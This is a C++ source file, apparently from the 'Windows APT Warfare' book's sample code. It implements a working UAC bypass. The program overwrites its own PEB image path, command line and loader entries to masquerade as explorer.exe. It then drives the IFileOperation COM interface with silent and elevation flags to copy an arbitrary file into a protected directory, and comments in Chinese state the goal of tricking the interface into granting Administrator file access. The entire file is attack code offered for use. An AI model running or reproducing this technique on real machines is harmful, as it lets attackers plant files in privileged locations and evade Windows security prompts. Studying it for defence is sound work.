﻿/**
 * iFileOperWrite.cpp
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <Shobjidl.h>
#include <winternl.h>
#include <windows.h>
#include <iostream>

typedef struct _UNICODE_STRING32
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING32, *PUNICODE_STRING32;

typedef struct mPEB32
{
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	UCHAR BitField;
	ULONG Mutant;
	ULONG ImageBaseAddress;
	PEB_LDR_DATA* Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	ULONG SubSystemData;
	ULONG ProcessHeap;
	ULONG FastPebLock;
	ULONG AtlThunkSListPtr;
	ULONG IFEOKey;
	ULONG CrossProcessFlags;
	ULONG UserSharedInfoPtr;
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	ULONG ApiSetMap;
};


typedef struct _LDR_DATA_TABLE_ENTRY32
{
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
	ULONG DllBase;
	ULONG EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING32 FullDllName;
	UNICODE_STRING32 BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY32 HashLinks;
		ULONG SectionPointer;
	};
	ULONG CheckSum;
	union
	{
		ULONG TimeDateStamp;
		ULONG LoadedImports;
	};
	ULONG EntryPointActivationContext;
	ULONG PatchInformation;
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;

// 進行檔案搬移動作，以 IFileOperation 元件下的 CopyItem 將檔案拷貝至目標目錄中
void iFileOpCopy(LPCWSTR destPath, LPCWSTR pathToFile) {
	IFileOperation* fileOperation = NULL;
	LPCWSTR filename = wcsrchr(pathToFile, '\\') + 1;
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr)) {
		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
		if (SUCCEEDED(hr)) {
			
			hr = fileOperation->SetOperationFlags(
				FOF_NOCONFIRMATION |
				FOF_SILENT |
				FOFX_SHOWELEVATIONPROMPT |
				FOFX_NOCOPYHOOKS |
				FOFX_REQUIREELEVATION |
				FOF_NOERRORUI);
			if (SUCCEEDED(hr)) {
				IShellItem* from = NULL, *to = NULL;
				hr = SHCreateItemFromParsingName(pathToFile, NULL, IID_PPV_ARGS(&from));
				if (SUCCEEDED(hr))
				{
					if (destPath)
						hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
					if (SUCCEEDED(hr))
					{

						hr = fileOperation->CopyItem(from, to, filename, NULL);
						if (NULL != to)
							to->Release();
					}
					from->Release();
				}
				if (SUCCEEDED(hr))
					hr = fileOperation->PerformOperations();
			}
			fileOperation->Release();
		}
		CoUninitialize();
	}
}

int wmain(int argc, wchar_t** argv) {
	if (argc == 1) {
		auto currName = wcsrchr(LPCWCHAR(argv[0]), '\\') ? wcsrchr(LPCWCHAR(argv[0]), '\\') + 1 : argv[0];
		wprintf(L"usage: %s [path/to/file] [where/to/write]\n", currName);
		return 0;
	}

	void(WINAPI * pfnRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString) =
		(void(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlInitUnicodeString");

	WCHAR lpExplorePath[MAX_PATH];
	ExpandEnvironmentStringsW(L"%SYSTEMROOT%\\explorer.exe", lpExplorePath, sizeof(lpExplorePath));

	// 將 PEB 中紀錄的執行檔路徑，偽造成檔案總管(explorer.exe)的外貌，以欺騙IFileOperation COM Interface 允許我們以 Administrator 身分進行檔案操作
	mPEB32* pPEB = (mPEB32*)__readfsdword(0x30);
	pfnRtlInitUnicodeString(&pPEB->ProcessParameters->ImagePathName, lpExplorePath);
	pfnRtlInitUnicodeString(&pPEB->ProcessParameters->CommandLine, lpExplorePath);

	PLIST_ENTRY header = &(pPEB->Ldr->InMemoryOrderModuleList);
	LDR_DATA_TABLE_ENTRY32* data = CONTAINING_RECORD(header->Flink, LDR_DATA_TABLE_ENTRY32, InMemoryOrderModuleList);
	pfnRtlInitUnicodeString((PUNICODE_STRING)&data->FullDllName, lpExplorePath);
	pfnRtlInitUnicodeString((PUNICODE_STRING)&data->BaseDllName, L"explorer.exe");

	iFileOpCopy(argv[2], argv[1]);
	return 0;
}
